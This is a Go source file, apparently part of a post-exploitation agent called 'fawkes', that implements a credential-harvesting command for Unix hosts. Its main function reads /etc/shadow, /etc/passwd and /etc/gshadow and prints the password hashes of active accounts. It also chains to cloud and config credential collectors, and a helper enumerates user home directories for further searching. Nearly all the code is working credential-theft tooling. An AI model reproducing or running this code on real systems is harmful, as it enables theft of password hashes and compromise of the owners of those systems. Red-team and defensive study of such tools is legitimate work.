//go:build !windows

package commands

import (
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"
)

func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
	switch strings.ToLower(args.Action) {
	case "shadow":
		return credShadow(args)
	case "cloud":
		return credCloud(args)
	case "configs":
		return credConfigs(args)
	case "all":
		return credAll(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: shadow, cloud, configs, all", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func credShadow(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("System Credential Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// /etc/shadow — hashed passwords
	sb.WriteString("--- /etc/shadow ---\n")
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		count := 0
		for _, line := range lines {
			if line == "" {
				continue
			}
			parts := strings.SplitN(line, ":", 3)
			if len(parts) < 2 {
				continue
			}
			user := parts[0]
			hash := parts[1]

			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
				continue
			}

			// Skip locked/disabled accounts
			if hash == "*" || hash == "" || strings.HasPrefix(hash, "!") {
				continue
			}

			sb.WriteString(fmt.Sprintf("  %s:%s\n", user, hash))
			count++
		}
		if count == 0 {
			sb.WriteString("  (no password hashes found — accounts may be locked)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v (requires root)\n", err))
	}

	// /etc/passwd — check for password hashes in passwd (legacy)
	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		for _, line := range lines {
			parts := strings.Split(line, ":")
			if len(parts) < 7 {
				continue
			}
			user := parts[0]
			shell := parts[6]

			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
				continue
			}

			if strings.Contains(shell, "nologin") || strings.Contains(shell, "false") || shell == "/usr/sbin/nologin" || shell == "/bin/false" {
				continue
			}

			uid := parts[2]
			gid := parts[3]
			home := parts[5]
			sb.WriteString(fmt.Sprintf("  %s (uid=%s, gid=%s, home=%s, shell=%s)\n", user, uid, gid, home, shell))

			if parts[1] != "x" && parts[1] != "*" && parts[1] != "" {
				sb.WriteString(fmt.Sprintf("    WARNING: Password hash in /etc/passwd: %s\n", parts[1]))
			}
		}
	}

	// /etc/gshadow if readable
	sb.WriteString("\n--- /etc/gshadow ---\n")
	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		count := 0
		for _, line := range lines {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) < 2 || parts[1] == "" || parts[1] == "!" || parts[1] == "*" {
				continue
			}
			sb.WriteString(fmt.Sprintf("  %s\n", line))
			count++
		}
		if count == 0 {
			sb.WriteString("  (no group passwords found)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func credAll(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	shadow := credShadow(args)
	sb.WriteString(shadow.Output)
	sb.WriteString("\n")

	cloud := credCloud(args)
	sb.WriteString(cloud.Output)
	sb.WriteString("\n")

	configs := credConfigs(args)
	sb.WriteString(configs.Output)

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// getUserHomes returns home directories from /etc/passwd, optionally filtered by user
func getUserHomes(filterUser string) []string {
	var homes []string

	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		if home, err := os.UserHomeDir(); err == nil {
			return []string{home}
		}
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		parts := strings.Split(line, ":")
		if len(parts) < 6 {
			continue
		}
		user := parts[0]
		home := parts[5]

		if filterUser != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(filterUser)) {
			continue
		}

		if home == "" || home == "/" || home == "/nonexistent" || home == "/dev/null" {
			continue
		}

		if info, err := os.Stat(home); err == nil && info.IsDir() {
			homes = append(homes, home)
		}
	}

	return homes
}
